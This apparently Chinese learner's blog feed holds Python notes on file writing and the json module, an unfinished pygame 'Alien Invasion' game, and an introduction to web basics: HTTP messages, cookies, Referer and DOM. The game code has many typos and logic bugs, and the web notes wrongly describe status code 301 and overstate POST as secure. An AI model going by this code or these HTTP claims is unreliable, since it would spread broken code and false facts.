<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#write_messages.py</span></span><br><span class="line">filename = <span class="string">&#x27;programming.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    file_object.write(<span class="string">&quot;I love programming.\n&quot;</span>)</span><br><span class="line">	file_object.write(<span class="string">&quot;敬请T期待@&quot;</span>)</span><br><span class="line">    file_object.write(<span class="string">&quot;KingWempity&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>programming.txt</p>
<blockquote>
<p>I love programming.<br>敬请T期待@KingWempity</p>
</blockquote>
<h3 id="存储数据"><a href="#存储数据" class="headerlink" title="存储数据"></a>存储数据</h3><blockquote>
<p>使用json模块来存储数据</p>
<p><strong>通常使用文件扩展名.json来指出文件存储的数据为JSON格式。</strong></p>
</blockquote>
<h4 id="json-dump"><a href="#json-dump" class="headerlink" title="json.dump()"></a>json.dump()</h4><blockquote>
<p>函数json.dump()接受两个实参：要存储的数据以及可用于存储数据的文件对象。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#number_writer.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">numbers = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>]</span><br><span class="line">filename = <span class="string">&#x27;numbers.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">    json.dump(numbers, f_obj)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">先导入模块json，再创建一个数字列表。我们指定了要将该数字列表存储到其中的文件的名称。通常使用文件扩展名.json来指出文件存储的数据为JSON格式。接下来，我们以写入模式打开这个文件，让json能够将数据写入其中。我们使用函数json.dump()将数字列表存储到文件numbers.json中。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>打开文件numbers.json</p>
<blockquote>
<p>[2, 3, 5, 7, 11, 13]</p>
</blockquote>
<h4 id="json-load"><a href="#json-load" class="headerlink" title="json.load()"></a>json.load()</h4><blockquote>
<p>函数json.load()加载存储在filename.json中的信息</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#number_reader.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">filename = <span class="string">&#x27;numbers.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">	numbers = json.load(f_obj)</span><br><span class="line"><span class="built_in">print</span>(numbers)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[2, 3, 5, 7, 11, 13]</span><br></pre></td></tr></table></figure></div>

<hr>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#remember_me.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">username = <span class="built_in">input</span>(<span class="string">&quot;What is your name? &quot;</span>)</span><br><span class="line">filename = <span class="string">&#x27;username.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">	json.dump(username, f_obj)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;We&#x27;ll remember you when you come back, &quot;</span> + username + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">What is your name? Eric</span><br><span class="line">We<span class="string">&#x27;ll remember you when you come back, Eric!</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#greet_user.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">filename = <span class="string">&#x27;username.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">	username = json.load(f_obj)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome back, &quot;</span> + username + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Welcome back, Eric!</span><br></pre></td></tr></table></figure></div>

<hr>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#remember_me.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># 如果以前存储了用户名，就加载它</span></span><br><span class="line"><span class="comment"># 否则，就提示用户输入用户名并存储它</span></span><br><span class="line">filename = <span class="string">&#x27;username.json&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">        username = json.load(f_obj)</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&quot;What is your name? &quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">    	json.dump(username, f_obj)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;We&#x27;ll remember you when you come back, &quot;</span> + username + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome back, &quot;</span> + username + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>首次运行</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">What is your name? Eric</span><br><span class="line">We<span class="string">&#x27;ll remember you when you come back, Eric!</span></span><br></pre></td></tr></table></figure></div>

<p>否则</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Welcome back, Eric!</span><br></pre></td></tr></table></figure></div>







<p><strong>至此，本书第一部分基础知识已基本完结撒花❀❀❀</strong></p>
<p>🎇🎇🎇</p>
<p>推荐几个个版本python知识学习的网址</p>
<blockquote>
<p><a class="link" href="https://www.runoob.com/python3/python3-tutorial.html">菜鸟教程Python3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" href="https://www.cainiaojc.com/python/python-tutorial.html">菜鸟教程Python <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>虽然都是菜鸟教程，但因为版本问题，版本界面有些许变化，笔者更适应第一个，因人而异，最适合自己的才是最好的！</p>
<p><a class="link" href="https://docs.python.org/zh-cn/3/index.html">Python.org <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Python官网的文档，里面有一切想要了解的东西！教程、标准库、语言参考、安装用法……</p>
<p>笔者不才，如有错误还望读者指正，后续会更新评论版块，欢迎大家留言指正！！！</p>
<p>敬请T期待！</p>
<p>感谢各位读者朋友的支持和理解！❀❀❀</p>
</blockquote>
]]></content>
      <categories>
        <category>Languages</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Learn</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实战</title>
    <url>/2024/02/07/Python%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="外星人入侵游戏开发"><a href="#外星人入侵游戏开发" class="headerlink" title="外星人入侵游戏开发"></a>外星人入侵游戏开发</h2><p>一、开发框架</p>
<p>总文件：alien_invasion</p>
<p>包含文件：</p>
<ul>
<li>image文件</li>
<li>alien_invasion.py</li>
<li>game_functions.py</li>
<li>ship.py</li>
<li>settings.py</li>
<li>bullet.py</li>
</ul>
<hr>
<p><strong>alien.invasion.py</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien_invasion.py</span></span><br><span class="line"><span class="comment">#一系列整个游戏都要用到的对象,游戏的主循环</span></span><br><span class="line"><span class="keyword">import</span> pygame<span class="comment">#模块pygame包含开发游戏所需的功能</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> settings <span class="keyword">import</span> Settings</span><br><span class="line"><span class="keyword">from</span> ship <span class="keyword">import</span> Ship</span><br><span class="line"><span class="keyword">import</span> game_functions <span class="keyword">as</span> gf</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_game</span>():</span><br><span class="line">    <span class="comment">#初始化游戏并创建一个屏幕对象</span></span><br><span class="line">    pygame.init()<span class="comment">#初始化背景设置</span></span><br><span class="line">    ai_settings = Settings()</span><br><span class="line">    screen = pygame.display.set_mode((ai_settings.screen_width,ai_settings.screen_height))</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    我们调用pygame.display.set_mode()来创建一个名为screen的显示窗口，这个游戏的所有图形元素都将在其中绘制。</span></span><br><span class="line"><span class="string">    通过将这些尺寸值传递给pygame.display.set_mode()，我们创建了一个宽1200像素、高800像素的游戏窗口</span></span><br><span class="line"><span class="string">    （你可以根据自己的显示器尺寸调整这些值）。</span></span><br><span class="line"><span class="string">    surface是屏幕的一部分，用于显示游戏元素。在这个游戏中，每个元素（如外星人或飞船）都是一个surface。</span></span><br><span class="line"><span class="string">    display.set_mode()返回的surface表示整个游戏窗口。</span></span><br><span class="line"><span class="string">    我们激活游戏的动画循环后，每经过一次循环都将自动重绘这个surface。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pygame.display.set_caption(<span class="string">&quot;Alien Invasion&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#设置背景色</span></span><br><span class="line">    bg_color = (<span class="number">230</span>,<span class="number">230</span>,<span class="number">230</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#创建一艘飞船</span></span><br><span class="line">    ship = Ship(ai_settings,screen)<span class="comment">#创建一个名为ship的Ship实例</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#开始游戏的主循环</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        gf.check_events(ship)</span><br><span class="line">        gf.ship.updat()<span class="comment">#玩家输入时，飞船位置更新</span></span><br><span class="line">        gf.update_screen(ai_settings,screen,ship)</span><br><span class="line"></span><br><span class="line">run_game()</span><br></pre></td></tr></table></figure></div>

<hr>
<p><strong>game_functions.py</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#game_functions.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;包含一系列函数，由它完成游戏的大部分工作.</span></span><br><span class="line"><span class="string">check_events()检测相关事件，按键的按下与松开，并且辅助check_keydown_events()和check_keyup_events()处理事件</span></span><br><span class="line"><span class="string">包含模块update_screen()用于每次执行主循环时的屏幕绘制</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_keydown_events</span>(<span class="params">event,ship</span>):<span class="comment">#检查鼠标键按下</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;响应按键&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> event.key == pygame.K_RITGHT:</span><br><span class="line">        ship.moving_right = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> event.key == pygame.K_LEFT:</span><br><span class="line">        ship.moving_left = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_keyup_events</span>(<span class="params">event,ship</span>):<span class="comment">#检查鼠标键松开</span></span><br><span class="line">    <span class="keyword">if</span> event.key == pygame.K_RIGHT:</span><br><span class="line">        ship.moving_right = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">elif</span> event.key ==pygame.K_LEFT:</span><br><span class="line">        ship.moving_left = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_events</span>(<span class="params">event,ship</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;响应按键和鼠标事件&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> events <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="keyword">if</span> events.<span class="built_in">type</span> == pygame.QUIT:</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">elif</span> events.<span class="built_in">type</span> == pygame.KEYDOWN:<span class="comment">#鼠标键按下时</span></span><br><span class="line">            check_keydown_events(event,ship)</span><br><span class="line">        <span class="keyword">elif</span> events.<span class="built_in">type</span> ==pygame.KEYUP:<span class="comment">#鼠标键松开时</span></span><br><span class="line">            check_keyup_events(event,ship)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_screen</span>(<span class="params">ai_settings,screen,ship</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;更新屏幕上的图像，并切换到新屏幕&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 每次循环都重新绘制屏幕</span></span><br><span class="line">    screen.fill(ai_settings.bg_color)  <span class="comment"># 这个方法只接受一个实参：一种颜色。</span></span><br><span class="line">    ship.blitme()  <span class="comment"># 将飞船绘制到屏幕</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 让最近绘制的屏幕可见</span></span><br><span class="line">    pygame.display.flip()  <span class="comment"># 命令Pygame让最近绘制的屏幕可见。营造平滑移动的效果。</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<hr>
<p><strong>ship.py</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Ship.py</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;包含__init__()、管理飞船位置的方法update()以及在屏幕上绘制飞船的方法blitme()&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ship</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,ai_settings,screen</span>):<span class="comment">#screen指定了要将飞船绘制到什么地方</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化飞船并设置其初始位置&quot;&quot;&quot;</span></span><br><span class="line">        self.screen = screen</span><br><span class="line">        self.ai_settings = ai_settings</span><br><span class="line">        <span class="comment">#加载飞船图像并获取其外接矩形</span></span><br><span class="line">        self.image = pygame.image.load(<span class="string">&#x27;.\images\ship.bmp&#x27;</span>)</span><br><span class="line">        self.rect = self.image.get_rect()<span class="comment">#飞船图像</span></span><br><span class="line">        self.screen_rect = screen.get_rect()<span class="comment">#屏幕</span></span><br><span class="line">        <span class="comment">#将每艘新飞船放在屏幕底部中央</span></span><br><span class="line">        self.rect.centerx = self.screen_rect.centerx<span class="comment">#self.rect.centerx（飞船中心的x坐标）</span></span><br><span class="line">        self.rect.bottom = self.screen_rect.bottom<span class="comment">#self.rect.bottom（飞船下边缘的y坐标）</span></span><br><span class="line">        <span class="comment">#在飞船的属性center中存储小数值</span></span><br><span class="line">        self.center = <span class="built_in">float</span>(self.rect.centerx)</span><br><span class="line">        <span class="comment">#移动标志</span></span><br><span class="line">        self.moving_right = <span class="literal">False</span>  <span class="comment">#向右移动标志</span></span><br><span class="line">        self.mobing_left = <span class="literal">False</span> <span class="comment">#向左移动标志</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">updat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;根据移动标志调整飞船的位置&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">#更新飞船的center值，而不是rect</span></span><br><span class="line">        <span class="comment">#self.rect.right返回飞船外接矩形的右边缘的x坐标，如果这个值小于self.screen_rect.right的值，就说明飞船未触及屏幕右边缘</span></span><br><span class="line">        <span class="keyword">if</span> self.moving_right <span class="keyword">and</span> self.rect.right &lt; self.screen_rect.right:</span><br><span class="line">            self.rect.centerx += self.ai_settings.ship_speed_factor</span><br><span class="line">        <span class="comment">#如果rect的左边缘的x坐标大于零，就说明飞船未触及屏幕左边缘</span></span><br><span class="line">        <span class="keyword">if</span> self.moving_left <span class="keyword">and</span> self.rect.left &gt; <span class="number">0</span>:</span><br><span class="line">            self.rect.centerx -= self.ai_settings.ship_speed_factor</span><br><span class="line">        <span class="comment">#根据self.rect.center更新rect对象</span></span><br><span class="line">        self.rect.centerx = self.center</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">blitme</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;在指定位置绘制飞船&quot;&quot;&quot;</span></span><br><span class="line">        self.screen.blit(self.image,self.rect)</span><br></pre></td></tr></table></figure></div>

<hr>
<p>settings.py</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#setting.py</span></span><br><span class="line"><span class="comment">#包含Setting类，只含有__init__()，初始化控制游戏外观和飞船的速度属性,射击子弹的属性</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Settings</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;存储《外星入侵》的所有设置的类&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#初始化游戏的设置</span></span><br><span class="line">        <span class="comment">#屏幕设置</span></span><br><span class="line">        self.screen_width = <span class="number">1200</span></span><br><span class="line">        self.screen_height = <span class="number">800</span></span><br><span class="line">        self.bg_color = (<span class="number">230</span>,<span class="number">230</span>,<span class="number">230</span>)<span class="comment">#灰色</span></span><br><span class="line">        <span class="comment">#飞船的设置</span></span><br><span class="line">        self.ship_speed_factor = <span class="number">1.5</span></span><br><span class="line">        <span class="comment">#设置子弹</span></span><br><span class="line">        self.bullet_speed_factor = <span class="number">1</span></span><br><span class="line">        self.bullet_width = <span class="number">3</span></span><br><span class="line">        self.bullet_hight = <span class="number">15</span></span><br><span class="line">        self.bullet_color = <span class="number">60</span>,<span class="number">60</span>,<span class="number">60</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<hr>
<p><strong>bullet.py</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bullet.py</span></span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">from</span> pygame.sprite <span class="keyword">import</span> Sprite<span class="comment">#精灵，可将游戏中相关的元素编组，进而同时操作编组中的所有元素。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bullet</span>(<span class="title class_ inherited__">Sprite</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一个对飞船发射的子弹进行管理的类&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, ai_settings, screen,ship</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;在飞船所处的位置创建一个子弹对象&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>(Bullet,self)._init__()</span><br><span class="line">        self.screen = screen</span><br><span class="line"></span><br><span class="line">        <span class="comment">#在(0,0)处创建一个表示子弹的矩形，在设置正确的位置</span></span><br><span class="line">        self.rect = pygame.Rect(<span class="number">0</span>,<span class="number">0</span>,ai_settings.bullet_width,ai_settings.bullet_height)</span><br><span class="line">        self.rect.centerx = ship.rect.centerx</span><br><span class="line">        self.rect.top = ship.rect.top</span><br><span class="line"></span><br><span class="line">        <span class="comment">#存储用小数表示的位置</span></span><br><span class="line">        self.y = <span class="built_in">float</span>(self.rect.y)</span><br><span class="line">        self.color  = ai_settings.bullet_color</span><br><span class="line">        self.speed_factor  = ai_settings.bullet_speed_factor</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;向上移动子弹&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">#更新表示子弹的位置的小数值</span></span><br><span class="line">        self.y -= self.speed_factor</span><br><span class="line">        <span class="comment">#更新表示子弹的rect位置</span></span><br><span class="line">        self.rect.y = self.y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">draw_bullet</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;在屏幕上绘制子弹&quot;&quot;&quot;</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;函数draw.rect()使用存储在self.color中的颜色填充表示子弹的rect占据的屏幕部分&quot;&quot;&quot;</span></span><br><span class="line">        pygame.draw.rect(self.screen,self.color,self.rect)</span><br></pre></td></tr></table></figure></div>



<hr>
<p><strong>images文件</strong></p>
<ul>
<li><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ship.bmp" alt="ship"></li>
</ul>
<hr>
<p>项目进度：12.6.4</p>
<p>敬请T期待s</p>
]]></content>
      <categories>
        <category>Languages</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>实战项目</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_白帽子</title>
    <url>/2024/01/25/Web-%E7%99%BD%E5%B8%BD%E5%AD%90/</url>
    <content><![CDATA[<h2 id="Web基础介绍"><a href="#Web基础介绍" class="headerlink" title="Web基础介绍"></a>Web基础介绍</h2><blockquote>
<p>知识点罗列：</p>
<ul>
<li>URL概念、结构格式</li>
<li>HTTP报文结构</li>
<li>cookie含义</li>
<li>Set-cookie含义</li>
<li>Referer的作用</li>
<li>状态码301和302的含义</li>
<li>Location的含义</li>
</ul>
</blockquote>
<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><blockquote>
<p>统一资源定位符（Uniform Resource Locator）</p>
</blockquote>
<blockquote>
<p>作用：定位服务器资源</p>
</blockquote>
<blockquote>
<p>URL格式：schemna:&#x2F;&#x2F;host[:post#]&#x2F;path&#x2F;…&#x2F;[?query-string][#anchor]</p>
<p>schemna	底层协议(例如：http,https,ftp…)</p>
<p>host		  服务器的域名或IP地址</p>
<p>:post 		服务器的端口，HTTP默认端口是80(可省略)，其他端口需要指明</p>
<p>&#x2F;path&#x2F;…&#x2F;	访问资源的路径</p>
<p>？query-string 发送给http服务器的数据</p>
<p>[#anchor]	 锚</p>
</blockquote>
<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><blockquote>
<p>超文本传输协议（Hyper Text Transfer Protocol）</p>
</blockquote>
<blockquote>
<p>作用：Web通信时使用的协议</p>
</blockquote>
<blockquote>
<ol>
<li><p>HTTP报文</p>
<p>HTTP报文是用于HTTP协议交互的信息，HTTP报文本身是由多行数据构成的字符串文本。客户端的HTTP报文叫做请求报文，服务器端的HTTP报文叫做响应报文。</p>
</li>
<li><p>HTTP报文结构</p>
<p><img lazyload src="/images/loading.svg" data-src="https://cdn.jsdelivr.net/gh/kingwempity/photo/images/http%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84.png" alt="http报文结构"></p>
<p><strong>报文首部</strong>是客户端或服务器端需处理的<code>请求或响应</code>的内容及属性， 可以传递额外的重要信息。报文首部包括请求行和请求头部。</p>
<p>空行</p>
<p><strong>报文主体</strong>主要包含应被发送的数据。通常，不一定有报文主体。</p>
</li>
<li><p>HTTP请求报文结构</p>
<p><img lazyload src="/images/loading.svg" data-src="https://cdn.jsdelivr.net/gh/kingwempity/photo/images/http%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84.png" alt="HTTP请求报文结构"></p>
<p>GET和POST的区别：</p>
<blockquote>
<p>（1）get是从服务器上获取数据（即下载），post是向服务器传送数据（即上传）。<br>（2）生成方式不同：<br>Get：URL输入；超连接；Form表单中method属性为get；Form表单中method为空。<br>Post只有一种：Form表单中method为Post。<br>（3）数据传送方式：Get传递的请求数据按照key-value的方式放在URL后面，在网址中可以直接看到，使用?分割URL和传输数据，传输的参数之间以&amp;相连，如：login.action?name&#x3D;user&amp;password&#x3D;123。所以安全性差。<br>POST方法会把请求的参数放到请求头部和空格下面的请求数据字段就是请求正文（请求体）中以&amp;分隔各个字段，请求行不包含参数，URL中不会额外附带参数。所以安全性高。<br>（3）发送数据大小的限制：通常GET请求可以用于获取轻量级的数据，而POST请求的内容数据量比较庞大些。<br>Get：1~2KB。get方法提交数据的大小直接影响到了URL的长度，但HTTP协议规范中其实是没有对URL限制长度的，限制URL长度的是客户端或服务器的支持的不同所影响。<br>Post：没有要求。post方式HTTP协议规范中也没有限定，起限制作用的是服务器的处理程序的能力。<br>（4）提交数据的安全：POST比GET方式的安全性要高。Get安全性差，Post安全性高。<br>通过GET提交数据，用户名和密码将明文出现在URL上，如果登录页面有浏览器缓存，或者其他人查看浏览器的历史记录，那么就可以拿到用户的账号和密码了。安全性将会很差。</p>
</blockquote>
</li>
<li><p>HTTP响应报文结构</p>
<p><img lazyload src="/images/loading.svg" data-src="https://cdn.jsdelivr.net/gh/kingwempity/photo/images/http%E5%93%8D%E5%BA%94%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84.png" alt="HTTP响应报文结构"></p>
</li>
</ol>
<hr>
<p>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</p>
<p>参考文章</p>
<p>原文链接：<a class="link" href="https://blog.csdn.net/qq_35887546/article/details/104216286">https://blog.csdn.net/qq_35887546/article/details/104216286 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<blockquote>
<p>HTTP请求的方式</p>
<p>–GET</p>
<p>–POST</p>
<p>–HEAD				 与GET请求类似，不同在于与服务器只返回HTTP头部信息，没有页面内容</p>
<p>–PUT					上传指定URL的描述</p>
<p>–DELETE			 删除指定资源</p>
<p>–OPTIONS 		 返回服务器支持的HTTP方法</p>
</blockquote>
<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><blockquote>
<p>cookie:相当于用户的凭证，类似与用户的通行证，很重要。</p>
<p>set-cookie:服务器要求浏览器设置cookie</p>
</blockquote>
<h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><blockquote>
<p>Referer的作用：</p>
<p>–告知服务器该请求的来源（浏览器自动加上）</p>
<p>–统计流量</p>
<p>–判断来源合法性：防止盗链，防止CSRF漏洞</p>
</blockquote>
<h3 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h3><blockquote>
<p>Location：跳转到地址</p>
</blockquote>
<h3 id="响应报文状态码"><a href="#响应报文状态码" class="headerlink" title="响应报文状态码"></a>响应报文状态码</h3><blockquote>
<p>响应报文状态码</p>
<p><strong>3</strong>：完成此请求必须进一步处理**</p>
<p>301——删除请求数据</p>
<p>302——在其他地址发现了请求数据</p>
<hr>
<p>详细状态码：<a class="link" href="https://blog.csdn.net/qq_35887546/article/details/104216807">https://blog.csdn.net/qq_35887546/article/details/104216807 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h2 id="前端开发基础知识"><a href="#前端开发基础知识" class="headerlink" title="前端开发基础知识"></a>前端开发基础知识</h2><blockquote>
<p>知识点罗列：</p>
<p>​	–JavaScript</p>
<p>​	–DOM</p>
<p>​	–BOM</p>
</blockquote>
<h3 id="javaScript"><a href="#javaScript" class="headerlink" title="javaScript"></a>javaScript</h3><blockquote>
<p>javaScript运行位置：</p>
<ul>
<li>HTML的<script></script></li>
<li>HTML的事件属性中</li>
<li>浏览器中的JavaScript控制台中的Console中</li>
</ul>
</blockquote>
<h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><blockquote>
<p>DOM本质：链接Web页面和编程语言</p>
<p>JavaScript + DOM：访问和操作HTML文档的标准方法</p>
</blockquote>
<blockquote>
<p>获取一个HTML元素内容</p>
<ul>
<li><p>tep1：获取元素</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>()<span class="comment">//获取元素</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>tep2：获取元素的内容</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">.<span class="property">innerHTML</span><span class="comment">//获取元素的内容</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>tep3：显示获取信息</p>
